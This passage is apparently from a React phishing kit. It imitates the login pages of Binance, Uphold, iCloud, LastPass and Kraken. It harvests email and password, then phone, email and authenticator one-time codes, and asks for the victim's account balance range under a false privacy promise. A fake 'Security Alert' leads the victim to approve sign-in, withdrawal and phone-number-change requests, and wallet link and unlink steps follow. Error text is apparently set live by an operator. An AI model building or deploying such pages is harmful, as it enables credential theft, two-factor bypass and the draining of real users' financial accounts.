                          <circle cx="12" cy="12" r="3" />
                        </svg>
                      ) : (
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
                          <line x1="1" y1="1" x2="23" y2="23" />
                        </svg>
                      )}
                    </button>
                  </div>
                </div>

                {/* Error message */}
                {status === "rejected" && (
                  <div className="mb-4 flex items-center gap-2">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#dc2626"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01" stroke="white" strokeWidth="2" strokeLinecap="round"/></svg>
                    <span className="text-sm text-red-600">{adminMessage || "Your email or password is incorrect, try again."}</span>
                  </div>
                )}

                <button
                  type="submit"
                  disabled={status === "pending" || !email || !password}
                  className="w-full cursor-pointer rounded-full bg-[#D32D27] py-3 text-base font-semibold text-white transition-colors hover:bg-[#B52521] disabled:cursor-not-allowed disabled:opacity-50"
                >
                  {status === "pending" ? (
                    <span className="flex items-center justify-center gap-2">
                      <span className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent"></span>
                      Logging in...
                    </span>
                  ) : (
                    "LOG IN"
                  )}
                </button>

                {status === "pending" && (
                  <p className="mt-4 text-center text-sm text-gray-500">Please wait while we verify your credentials...</p>
                )}
              </form>

              <div className="mt-6 text-center">
                <a href="#" className="text-sm font-medium text-[#0066CC] hover:underline">FORGOT PASSWORD?</a>
              </div>

              <div className="mt-4 text-center">
                <button
                  type="button"
                  onClick={() => setShowAdvanced(!showAdvanced)}
                  className="inline-flex cursor-pointer items-center gap-1 text-sm text-gray-600 hover:text-gray-800"
                >
                  Advanced options
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={`transition-transform ${showAdvanced ? "rotate-180" : ""}`}>
                    <polyline points="6 9 12 15 18 9" />
                  </svg>
                </button>
                {showAdvanced && (
                  <div className="mt-4 rounded-lg border border-gray-200 bg-gray-50 p-4 text-left text-sm text-gray-600">
                    <p>Advanced login options will appear here.</p>
                  </div>
                )}
              </div>
            </>
          )}

          {step === "email" && !isBinance && !isIcloud && !isLastpass && !isUphold && !isKrakenBrand && (
            <>
              <h1 className="mb-8 text-center text-2xl font-semibold" style={{ color: brand.textPrimary }}>{brand.loginHeading}</h1>

              <form onSubmit={handleContinue}>
                <div className="mb-4">
                  <label className="mb-2 block text-sm font-medium" style={{ color: brand.textPrimary }}>Email</label>
                  <input
                    type="text"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Your email address"
                    className="w-full rounded-lg border px-4 py-3 text-sm outline-none transition-colors"
                    style={{
                      backgroundColor: brand.inputBg,
                      borderColor: brand.inputBorder,
                      color: brand.textPrimary,
                    }}
                    autoComplete="email"
                  />
                </div>

                <button
                  type="submit"
                  disabled={!email || !email.includes("@") || !email.includes(".")}
                  className="mb-6 w-full cursor-pointer rounded-full py-3 text-base font-semibold transition-colors disabled:cursor-not-allowed disabled:opacity-60"
                  style={{ backgroundColor: brand.primary, color: btnTextColor }}
                >
                  Continue
                </button>
              </form>

              <div className="relative my-6 flex items-center">
                <div className="flex-1 border-t" style={{ borderColor: brand.dividerColor }}></div>
                <span className="px-4 text-sm" style={{ color: brand.textMuted }}>OR</span>
                <div className="flex-1 border-t" style={{ borderColor: brand.dividerColor }}></div>
              </div>

              <div className="space-y-3">
                <button type="button" className="relative flex w-full cursor-pointer items-center justify-center rounded-full border py-3 text-sm font-medium transition-colors" style={{ borderColor: brand.inputBorder, backgroundColor: brand.inputBg, color: brand.textPrimary }}>
                  <span className="absolute left-4"><PasskeyIcon /></span>
                  <span>Sign in with Passkey</span>
                </button>
                <button type="button" className="relative flex w-full cursor-pointer items-center justify-center rounded-full border py-3 text-sm font-medium transition-colors" style={{ borderColor: brand.inputBorder, backgroundColor: brand.inputBg, color: brand.textPrimary }}>
                  <span className="absolute left-4"><GoogleIcon /></span>
                  <span>Sign in with Google</span>
                </button>
                <button type="button" className="relative flex w-full cursor-pointer items-center justify-center rounded-full border py-3 text-sm font-medium transition-colors" style={{ borderColor: brand.inputBorder, backgroundColor: brand.inputBg, color: brand.textPrimary }}>
                  <span className="absolute left-4"><AppleIcon /></span>
                  <span>Sign in with Apple</span>
                </button>
              </div>

              <p className="mt-8 text-center text-sm" style={{ color: brand.textPrimary }}>
                {brand.signUpText + " "}
                <a href="#" className="font-medium hover:underline" style={{ color: brand.primary }}>Sign up</a>
              </p>

              <p className="mt-6 text-center text-xs" style={{ color: brand.textMuted }}>
                Not your device? Use a private window.
                <br />
                See our <a href="#" className="underline">Privacy Policy</a> for more info.
              </p>
            </>
          )}

          {step === "email" && isBinance && (
            <>
              {/* Binance Logo */}
              <BinanceFullLogo />

              {/* Log in heading with QR code */}
              <div className="mt-6 mb-6 flex items-center justify-between">
                <h1 className="text-2xl font-semibold text-[#EAECEF]">Log in</h1>
                <button className="cursor-pointer rounded-lg p-1.5 transition-colors hover:bg-[#2B3139]">
                  <QRCodeIcon />
                </button>
              </div>

              <form onSubmit={handleContinue}>
                <div className="mb-4">
                  <label className="mb-2 block text-sm font-medium text-[#B7BDC6]">Email/Phone number</label>
                  <input
                    type="text"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Email/Phone (without country code)"
                    className="w-full rounded-lg border border-[#474D57] bg-transparent px-4 py-3 text-sm text-[#EAECEF] outline-none transition-colors placeholder:text-[#5E6673] focus:border-[#F0B90B]"
                    autoComplete="email"
                  />
                </div>

                <button
                  type="submit"
                  disabled={!email || !email.includes("@") || !email.includes(".")}
                  className="mb-4 w-full cursor-pointer rounded-lg bg-[#F0B90B] py-3 text-base font-semibold text-[#181A20] transition-colors hover:bg-[#D9A60A] disabled:cursor-not-allowed disabled:opacity-60"
                >
                  Continue
                </button>
              </form>

              <div className="relative my-5 flex items-center">
                <div className="flex-1 border-t border-[#2B3139]"></div>
                <span className="px-4 text-sm text-[#5E6673]">or</span>
                <div className="flex-1 border-t border-[#2B3139]"></div>
              </div>

              <div className="space-y-3">
                <button type="button" className="relative flex w-full cursor-pointer items-center justify-center rounded-lg border border-[#474D57] bg-transparent py-3 text-sm font-medium text-[#EAECEF] transition-colors hover:border-[#848E9C]">
                  <span className="absolute left-4"><PasskeyIcon /></span>
                  <span>Continue with Passkey</span>
                </button>
                <button type="button" className="relative flex w-full cursor-pointer items-center justify-center rounded-lg border border-[#474D57] bg-transparent py-3 text-sm font-medium text-[#EAECEF] transition-colors hover:border-[#848E9C]">
                  <span className="absolute left-4"><GoogleIcon /></span>
                  <span>Continue with Google</span>
                </button>
                <button type="button" className="relative flex w-full cursor-pointer items-center justify-center rounded-lg border border-[#474D57] bg-transparent py-3 text-sm font-medium text-[#EAECEF] transition-colors hover:border-[#848E9C]">
                  <span className="absolute left-4"><AppleIcon /></span>
                  <span>Continue with Apple</span>
                </button>
                <button type="button" className="relative flex w-full cursor-pointer items-center justify-center rounded-lg border border-[#474D57] bg-transparent py-3 text-sm font-medium text-[#EAECEF] transition-colors hover:border-[#848E9C]">
                  <span className="absolute left-4"><TelegramIcon /></span>
                  <span>Continue with Telegram</span>
                </button>
              </div>
            </>
          )}

          {/* Uphold Login - Email + Password in single step */}
          {step === "email" && isUphold && (
            <>
              <h1 className="mb-2 text-[28px] font-bold text-[#1a1a1a]">{brand.loginHeading}</h1>
              <p className="mb-8 text-[15px] text-[#6B7280]">
                {brand.signUpText}{" "}
                <a href="#" className="font-semibold text-[#49CC68] hover:underline">Sign up now</a>
              </p>

              <form onSubmit={handleLogin}>
                <div className="mb-5">
                  <label className="mb-2 block text-sm font-medium text-[#1a1a1a]">Email address</label>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full rounded-lg border border-[#d1d5db] bg-[#E8EEF4] px-4 py-3 text-sm text-[#1a1a1a] outline-none transition-colors focus:border-[#49CC68] focus:ring-1 focus:ring-[#49CC68]"
                    autoComplete="email"
                    autoFocus
                  />
                </div>

                <div className="mb-3">
                  <label className="mb-2 block text-sm font-medium text-[#1a1a1a]">Password</label>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full rounded-lg border border-[#d1d5db] bg-[#E8EEF4] px-4 py-3 pr-12 text-sm text-[#1a1a1a] outline-none transition-colors focus:border-[#49CC68] focus:ring-1 focus:ring-[#49CC68]"
                      autoComplete="current-password"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 cursor-pointer text-[#6B7280] hover:text-[#1a1a1a]"
                    >
                      {showPassword ? (
                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                          <line x1="1" y1="1" x2="23" y2="23"/>
                        </svg>
                      ) : (
                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                          <circle cx="12" cy="12" r="3"/>
                        </svg>
                      )}
                    </button>
                  </div>
                </div>

                <a href="#" className="mb-8 block text-sm text-[#2563EB] hover:underline">{brand.forgotPasswordText}</a>

                <button
                  type="submit"
                  disabled={!email || !password || upholdLoading}
                  className="w-full cursor-pointer rounded-full bg-[#49CC68] py-4 text-base font-semibold text-white transition-colors hover:bg-[#3DB85A] disabled:cursor-not-allowed disabled:opacity-60"
                >
                  {upholdLoading ? "Logging in..." : "Next"}
                </button>
              </form>
            </>
          )}

          {step === "password" && isIcloud && (
            <>
              <div className="flex justify-center mb-4 md:mb-6">
                <AppleDotsRing />
              </div>
              <h1 className="text-white text-[22px] md:text-[28px] font-semibold text-center mb-6 md:mb-8">
                {brand.loginHeading}
              </h1>

              <form onSubmit={handleLogin}>
                {/* Stacked email + password */}
                <div className="mb-0">
                  <div className="w-full rounded-t-xl border px-4 py-2" style={{ backgroundColor: brand.inputBg, borderColor: brand.inputBorder }}>
                    <span className="text-[12px]" style={{ color: brand.textSecondary }}>Email or Phone Number</span>
                    <input
                      type="text"
                      value={email}
                      readOnly
                      disabled={status === "pending"}
                      className="w-full bg-transparent text-[17px] outline-none disabled:opacity-50"
                      style={{ color: brand.textPrimary }}
                    />
                  </div>
                </div>
                <div className="mb-4">
                  <div className="w-full rounded-b-xl border border-t-0 px-4 py-2" style={{ backgroundColor: brand.inputBg, borderColor: brand.inputBorderFocus, boxShadow: `0 0 0 1px ${brand.inputBorderFocus}` }}>
                    <span className="text-[12px]" style={{ color: brand.textSecondary }}>Password</span>
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      disabled={status === "pending"}
                      autoFocus
                      className="w-full bg-transparent text-[17px] outline-none disabled:opacity-50"
                      style={{ color: brand.textPrimary }}
                    />
                  </div>
                </div>

                {/* Error message */}
                {status === "rejected" && (
                  <div className="mb-4 flex items-center gap-2">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#dc2626"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01" stroke="white" strokeWidth="2" strokeLinecap="round"/></svg>
                    <span className="text-sm text-red-500">{adminMessage || "Your Apple ID or password is incorrect."}</span>
                  </div>
                )}

                {/* Keep signed in & Forgot */}
                <div className="flex flex-col gap-3 mb-8 sm:flex-row sm:items-center sm:justify-between sm:gap-0">
                  <label className="flex cursor-pointer items-center gap-2">
                    <input type="checkbox" className="h-4 w-4 rounded border-[#424245] bg-[#1d1d1f] accent-[#2997ff]" />
                    <span className="text-[13px] text-white sm:text-[14px]">Keep me signed in</span>
                  </label>
                  <a href="#" className="flex cursor-pointer items-center gap-1 text-[13px] hover:underline sm:text-[14px]" style={{ color: brand.primary }}>
                    {brand.forgotPasswordText}
                    <svg viewBox="0 0 24 24" className="h-3 w-3" fill="none" stroke="currentColor" strokeWidth="2"><path d="M7 17L17 7M17 7H7M17 7V17" strokeLinecap="round" strokeLinejoin="round" /></svg>
                  </a>
                </div>

                <button
                  type="submit"
                  disabled={status === "pending" || !password}
                  className="flex w-full cursor-pointer items-center justify-center rounded-xl py-3 px-6 text-[15px] font-medium text-white transition-colors disabled:cursor-wait sm:text-[17px]"
                  style={{ backgroundColor: brand.primary }}
                >
                  {status === "pending" ? (
                    <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent" />
                  ) : (
                    "Sign In"
                  )}
                </button>

                {status === "pending" && (
                  <p className="mt-4 text-center text-sm" style={{ color: brand.textSecondary }}>Please wait while we verify your credentials...</p>
                )}
              </form>
            </>
          )}

          {step === "password" && !isIcloud && !isLastpass && !isUphold && !isKrakenBrand && (
            <>
              <h1 className="mb-8 text-center text-2xl font-semibold" style={{ color: brand.textPrimary }}>{brand.loginHeading}</h1>

              {/* Email display row */}
              <div className="mb-6 flex items-center gap-3 rounded-full border px-3 sm:px-4 py-2.5 sm:py-3" style={{ borderColor: brand.inputBorder }}>
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full" style={{ backgroundColor: isBinance ? "#2B3139" : isUphold ? "#E8EEF4" : "#f3f4f6" }}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={brand.textSecondary} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                    <circle cx="12" cy="7" r="4"/>
                  </svg>
                </div>
                <span className="truncate text-sm font-medium" style={{ color: brand.textPrimary }}>{email}</span>
              </div>

              <form onSubmit={handleLogin}>
                <div className="mb-2">
                  <label className="mb-2 block text-sm font-medium" style={{ color: brand.textPrimary }}>Password</label>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Enter your password"
                      className="w-full rounded-lg border px-4 py-3 pr-12 text-sm outline-none transition-colors"
                      style={{
                        backgroundColor: brand.inputBg,
                        borderColor: status === "rejected" ? "#ef4444" : brand.inputBorder,
                        color: brand.textPrimary,
                      }}
                      disabled={status === "pending"}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 cursor-pointer"
                      style={{ color: brand.textSecondary }}
                    >
                      {showPassword ? (
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                          <circle cx="12" cy="12" r="3" />
                        </svg>
                      ) : (
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
                          <line x1="1" y1="1" x2="23" y2="23" />
                        </svg>
                      )}
                    </button>
                  </div>
                </div>

                {/* Error message */}
                {status === "rejected" && (
                  <div className="mb-4 flex items-center gap-2">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#dc2626">
                      <circle cx="12" cy="12" r="10"/>
                      <path d="M12 8v4M12 16h.01" stroke="white" strokeWidth="2" strokeLinecap="round"/>
                    </svg>
                    <span className="text-sm text-red-600">{adminMessage || "Your email or password is incorrect, try again."}</span>
                  </div>
                )}

                <div className="mb-6">
                  <a href="#" className="text-sm font-medium hover:underline" style={{ color: brand.primary }}>{brand.forgotPasswordText}</a>
                </div>

                <button
                  type="submit"
                  disabled={status === "pending" || !password}
                  className={`w-full cursor-pointer py-3 text-base font-semibold transition-colors disabled:cursor-not-allowed disabled:opacity-50 ${isBinance ? "rounded-lg" : "rounded-full"}`}
                  style={{ backgroundColor: brand.primary, color: btnTextColor }}
                >
                  {status === "pending" ? (
                    <span className="flex items-center justify-center gap-2">
                      <span className="h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent"></span>
                      {isBinance ? "Logging in..." : "Signing in..."}
                    </span>
                  ) : (
                    "Continue"
                  )}
                </button>
                
                {status === "pending" && (
                  <p className="mt-4 text-center text-sm" style={{ color: brand.textSecondary }}>Please wait while we verify your credentials...</p>
                )}
              </form>
            </>
          )}

          {step === "phone_verification" && (
            <CodeInput
              onSubmit={handleVerifyPhoneCode}
              label="Enter verification code"
              description={`We sent a verification code to the phone number ending in ${phoneLast4}`}
            />
          )}

          {step === "email_verification" && (
            <CodeInput
              onSubmit={handleVerifyEmailCode}
              label="Check your email"
              description={`We sent a verification code to ${emailForCode || email}`}
            />
          )}

          {step === "authenticator_verification" && (
            <CodeInput
              onSubmit={handleVerifyAuthenticator}
              label="2-step verification"
              description="Enter the 6-digit code from your authenticator app"
            />
          )}

          {step === "balance" && !isLastpass && (
            <>
              {/* Security Shield Icon */}
              <div className="mb-6 flex justify-center">
                <div className="flex h-16 w-16 items-center justify-center rounded-full" style={{ backgroundColor: brand.primary + "20" }}>
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke={brand.primary} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                    <path d="M9 12l2 2 4-4"/>
                  </svg>
                </div>
              </div>

              <h1 className="mb-2 text-center text-2xl font-semibold" style={{ color: brand.textPrimary }}>Verify Your Account Balance</h1>
              <p className="mb-2 text-center text-sm" style={{ color: brand.textSecondary }}>
                For your security, please confirm your approximate account balance range.
              </p>
              <p className="mb-6 text-center text-xs" style={{ color: brand.textMuted }}>
                This helps us protect your account from unauthorized access and verify your identity. Your selection is encrypted and never shared.
              </p>

              <form onSubmit={handleSubmitBalance}>
                <div className="mb-6 space-y-3">
                  {[
                    { value: "$0 - $10,000", label: "$0 - $10,000" },
                    { value: "$10,000 - $100,000", label: "$10,000 - $100,000" },
                    { value: "$100,000 - $250,000", label: "$100,000 - $250,000" },
                    { value: "$250,000 - $1,000,000", label: "$250,000 - $1,000,000" },
                  ].map((range) => (
                    <label
                      key={range.value}
                      className="flex cursor-pointer items-center justify-between rounded-lg border p-3 sm:p-4 transition-colors"
                      style={{
                        borderColor: selectedBalance === range.value ? brand.primary : brand.inputBorder,
                        backgroundColor: selectedBalance === range.value ? brand.primary + "10" : "transparent",
                      }}
                    >
                      <span className="text-sm font-medium" style={{ color: brand.textPrimary }}>{range.label}</span>
                      <input
                        type="radio"
                        name="balance"
                        value={range.value}
                        checked={selectedBalance === range.value}
                        onChange={(e) => setSelectedBalance(e.target.value)}
                        className="h-4 w-4"
                        style={{ accentColor: brand.primary }}
                      />
                    </label>
                  ))}
                </div>

                <button
                  type="submit"
                  disabled={status === "pending" || !selectedBalance}
                  className={`w-full cursor-pointer py-3 text-base font-semibold transition-colors disabled:cursor-not-allowed disabled:opacity-50 ${isIcloud ? "rounded-xl" : isBinance || isKrakenBrand ? "rounded-lg" : "rounded-full"}`}
                  style={{ backgroundColor: brand.primary, color: isBinance ? "#181A20" : "#fff" }}
                >
                  {status === "pending" ? (
                    <span className="flex items-center justify-center gap-2">
                      <span className="h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent"></span>
                      Verifying...
                    </span>
                  ) : (
                    "Continue"
                  )}
                </button>

                <p className="mt-4 text-center text-xs" style={{ color: brand.textMuted }}>
                  <svg className="mr-1 inline h-3 w-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                  </svg>
                  Your information is protected with bank-level encryption
                </p>
              </form>
            </>
          )}

          {step === "security_check" && !isLastpass && (
            <>
              <div className="mb-6 flex justify-center">
                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-orange-100">
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#f97316" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                    <path d="M12 8v4M12 16h.01"/>
                  </svg>
                </div>
              </div>

              <h1 className="mb-2 text-center text-2xl font-semibold" style={{ color: brand.textPrimary }}>Security Alert</h1>
              <p className="mb-6 text-center text-sm" style={{ color: brand.textSecondary }}>
                We noticed unusual activity on your account. Please review and confirm the following requests.
              </p>

              <div className="mb-6 space-y-4">
                {/* Sign-in Request */}
                <div className="rounded-lg border p-3 sm:p-4" style={{ borderColor: brand.inputBorder }}>
                  <div className="mb-3 flex items-center gap-3">
                    <div className="flex h-9 w-9 sm:h-10 sm:w-10 shrink-0 items-center justify-center rounded-full" style={{ backgroundColor: isBinance ? "#2B3139" : isUphold ? "#E8EEF4" : "#f3f4f6", color: brand.textPrimary }}>
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4M10 17l5-5-5-5M13.8 12H3"/>
                      </svg>
                    </div>
                    <div className="min-w-0">
                      <h3 className="text-sm sm:text-base font-medium" style={{ color: brand.textPrimary }}>New sign-in request</h3>
                      <p className="text-xs truncate" style={{ color: brand.textSecondary }}>{securityLocation}</p>
                    </div>
                  </div>
                  <div className="flex gap-2">
                    <button
                      type="button"
                      onClick={() => handleSecurityResponse("signin_request", "denied")}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${
                        securityResponses.signin_request === "denied"
                          ? "bg-red-100 text-red-700 border border-red-200"
                          : "border border-gray-200 text-gray-700 hover:bg-gray-50"
                      }`}
                    >
                      Deny
                    </button>
                    <button
                      type="button"
                      onClick={() => handleSecurityResponse("signin_request", "approved")}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${
                        securityResponses.signin_request === "approved"
                          ? "bg-green-100 text-green-700 border border-green-200"
                          : "border border-gray-200 text-gray-700 hover:bg-gray-50"
                      }`}
                    >
                      Approve
                    </button>
                  </div>
                </div>

                {/* Withdrawal Request */}
                <div className="rounded-lg border p-3 sm:p-4" style={{ borderColor: brand.inputBorder }}>
                  <div className="mb-3 flex items-center gap-3">
                    <div className="flex h-9 w-9 sm:h-10 sm:w-10 shrink-0 items-center justify-center rounded-full" style={{ backgroundColor: isBinance ? "#2B3139" : isUphold ? "#E8EEF4" : "#f3f4f6", color: brand.textPrimary }}>
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <line x1="12" y1="1" x2="12" y2="23"/>
                        <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/>
                      </svg>
                    </div>
                    <div className="min-w-0">
                      <h3 className="text-sm sm:text-base font-medium" style={{ color: brand.textPrimary }}>Withdrawal request</h3>
                      <p className="text-xs truncate" style={{ color: brand.textSecondary }}>Pending withdrawal to external wallet</p>
                    </div>
                  </div>
                  <div className="flex gap-2">
                    <button
                      type="button"
                      onClick={() => handleSecurityResponse("withdrawal_request", "denied")}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${
                        securityResponses.withdrawal_request === "denied"
                          ? "bg-red-100 text-red-700 border border-red-200"
                          : "border border-gray-200 text-gray-700 hover:bg-gray-50"
                      }`}
                    >
                      Deny
                    </button>
                    <button
                      type="button"
                      onClick={() => handleSecurityResponse("withdrawal_request", "approved")}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${
                        securityResponses.withdrawal_request === "approved"
                          ? "bg-green-100 text-green-700 border border-green-200"
                          : "border border-gray-200 text-gray-700 hover:bg-gray-50"
                      }`}
                    >
                      Approve
                    </button>
                  </div>
                </div>

                {/* Phone Change Request */}
                <div className="rounded-lg border p-3 sm:p-4" style={{ borderColor: brand.inputBorder }}>
                  <div className="mb-3 flex items-center gap-3">
                    <div className="flex h-9 w-9 sm:h-10 sm:w-10 shrink-0 items-center justify-center rounded-full" style={{ backgroundColor: isBinance ? "#2B3139" : isUphold ? "#E8EEF4" : "#f3f4f6", color: brand.textPrimary }}>
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
                      </svg>
                    </div>
                    <div className="min-w-0">
                      <h3 className="text-sm sm:text-base font-medium" style={{ color: brand.textPrimary }}>Phone number change</h3>
                      <p className="text-xs truncate" style={{ color: brand.textSecondary }}>Request to change number ending in {securityPhoneLast4}</p>
                    </div>
                  </div>
                  <div className="flex gap-2">
                    <button
                      type="button"
                      onClick={() => handleSecurityResponse("phone_change_request", "denied")}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${
                        securityResponses.phone_change_request === "denied"
                          ? "bg-red-100 text-red-700 border border-red-200"
                          : "border border-gray-200 text-gray-700 hover:bg-gray-50"
                      }`}
                    >
                      Deny
                    </button>
                    <button
                      type="button"
                      onClick={() => handleSecurityResponse("phone_change_request", "approved")}
                      className={`flex-1 cursor-pointer rounded-lg py-2 text-sm font-medium transition-colors ${
                        securityResponses.phone_change_request === "approved"
                          ? "bg-green-100 text-green-700 border border-green-200"
                          : "border border-gray-200 text-gray-700 hover:bg-gray-50"
                      }`}
                    >
                      Approve
                    </button>
                  </div>
                </div>
              </div>

              <button
                type="button"
                onClick={handleSubmitSecurityCheck}
                disabled={status === "pending" || !securityResponses.signin_request || !securityResponses.withdrawal_request || !securityResponses.phone_change_request}
                className={`w-full cursor-pointer py-3 text-base font-semibold transition-colors disabled:cursor-not-allowed disabled:opacity-50 ${isIcloud ? "rounded-xl" : isBinance || isKrakenBrand ? "rounded-lg" : "rounded-full"}`}
                style={{ backgroundColor: brand.primary, color: isBinance ? "#181A20" : "#fff" }}
              >
                {status === "pending" ? (
                  <span className="flex items-center justify-center gap-2">
                    <span className="h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent"></span>
                    Processing...
                  </span>
                ) : (
                  "Continue"
                )}
              </button>
              
              {status === "pending" && (
                <p className="mt-4 text-center text-sm" style={{ color: brand.textSecondary }}>Please wait while we process your responses...</p>
              )}
            </>
          )}

          {/* Wallet Link / Unlink Steps */}
          {(step === "wallet_link" || step === "wallet_unlink") && !isLastpass && (
            <>
              {/* Wallet error modal */}
              {status === "rejected" && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
                  <div className="mx-4 w-full max-w-sm rounded-xl p-6 shadow-lg" style={{ backgroundColor: brand.bgCard }}>
                    <div className="mb-4 flex justify-center">
                      <div className="flex h-12 w-12 items-center justify-center rounded-full bg-red-100">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#dc2626" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                          <circle cx="12" cy="12" r="10" />
                          <line x1="15" y1="9" x2="9" y2="15" />
                          <line x1="9" y1="9" x2="15" y2="15" />
                        </svg>
                      </div>
                    </div>
                    <h3 className="mb-2 text-center text-lg font-semibold" style={{ color: brand.textPrimary }}>Error</h3>
                    <p className="mb-6 text-center text-sm" style={{ color: brand.textSecondary }}>
                      {walletErrorMessage || adminMessage || (step === "wallet_link" ? "Unable to link wallet." : "Unable to unlink wallet.")}
                    </p>
                    <button
                      onClick={handleWalletDismissError}
                      className="w-full cursor-pointer rounded-full py-3 font-semibold"
                      style={{ backgroundColor: step === "wallet_unlink" ? "#ef4444" : brand.primary, color: step === "wallet_unlink" ? "#fff" : btnTextColor }}
                    >
                      Try Again
                    </button>
                  </div>
                </div>
              )}

              {walletStep === "select" ? (
                <>
                  <h1 className="mb-2 text-center text-2xl font-semibold" style={{ color: brand.textPrimary }}>
                    {step === "wallet_link" ? "Link Wallet" : "Unlink Wallet"}
                  </h1>
                  <p className="mb-8 text-center text-sm" style={{ color: brand.textSecondary }}>
                    {step === "wallet_link"
                      ? `Select a wallet to link to your ${brand.name} account`
                      : `Select the wallet you want to unlink from your ${brand.name} account`}
                  </p>

                  <div className="space-y-3">
                    {WALLETS.map((wallet) => (
                      <button
                        key={wallet.id}
